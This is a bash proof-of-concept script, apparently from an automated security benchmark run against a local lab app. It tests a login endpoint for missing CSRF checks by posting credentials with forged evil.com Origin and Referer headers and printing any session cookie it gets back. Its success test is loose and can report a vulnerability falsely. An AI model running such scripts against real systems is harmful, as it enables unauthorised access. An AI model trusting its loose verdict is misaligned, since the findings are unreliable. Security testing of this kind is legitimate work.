#!/bin/bash
# POC: CSRF attack on login endpoint - demonstrates cross-origin request succeeding without CSRF token validation
# Target: ./repo
# Created: 2025-12-02T16:21:56.976Z
# Session: benchmark-XBEN-104-24-mioryccy

# CSRF POC: Cross-Site Request Forgery Attack on Login Endpoint
# This script demonstrates that the /login endpoint accepts requests from different origins
# without CSRF token validation or proper origin verification

TARGET_URL="${1:-http://localhost:8080}"
LOGIN_ENDPOINT="${TARGET_URL}/login"
USERNAME="test"
PASSWORD="test"

echo "[*] CSRF Vulnerability POC - Login Endpoint"
echo "[*] Target: $LOGIN_ENDPOINT"
echo ""

# Step 1: First, attempt to get the login form to check for CSRF tokens
echo "[+] Step 1: Checking login form for CSRF token..."
FORM_RESPONSE=$(curl -s "$LOGIN_ENDPOINT")

if echo "$FORM_RESPONSE" | grep -q "csrf_token\|_token\|__RequestVerificationToken"; then
    echo "[!] CSRF token field detected in form"
    CSRF_TOKEN=$(echo "$FORM_RESPONSE" | grep -oP '(csrf_token|_token|__RequestVerificationToken)["\s]*value="\K[^"]+' | head -1)
    if [ -n "$CSRF_TOKEN" ]; then
        echo "[+] Extracted CSRF token: $CSRF_TOKEN"
    fi
else
    echo "[!] No CSRF token field found in login form - VULNERABLE"
fi

echo ""

# Step 2: Perform CSRF attack - send login request from cross-origin with malicious headers
echo "[+] Step 2: Attempting CSRF attack with cross-origin request..."
echo "[*] Sending POST request with Origin: http://evil.com and Referer: http://evil.com"
echo ""

CSRF_RESPONSE=$(curl -v -X POST \
  -H "Origin: http://evil.com" \
  -H "Referer: http://evil.com" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -d "username=${USERNAME}&password=${PASSWORD}" \
  "${LOGIN_ENDPOINT}" 2>&1)

# Check response
if echo "$CSRF_RESPONSE" | grep -q "Set-Cookie.*session\|302\|200"; then
    echo "[+] CSRF Attack Successful!"
    echo "[+] Response contains:"
    if echo "$CSRF_RESPONSE" | grep -q "Set-Cookie"; then
        echo "    - Session cookie set (indicating successful login)"
        SESSION_COOKIE=$(echo "$CSRF_RESPONSE" | grep -oP 'Set-Cookie: \K[^;]+' | head -1)
        echo "    - Cookie: $SESSION_COOKIE"
    fi
    if echo "$CSRF_RESPONSE" | grep -q "^< HTTP.*302"; then
        echo "    - HTTP 302 redirect (post-login redirect)"
    fi
    echo ""
    echo "[!] VULNERABILITY CONFIRMED: Application accepts login requests from different origins"
    echo "[!] No CSRF token validation performed"
    echo "[!] Origin/Referer headers not validated"
    exit 0
else
    echo "[!] CSRF Attack Failed"
    echo "Response:"
    echo "$CSRF_RESPONSE" | head -20
    exit 1
fi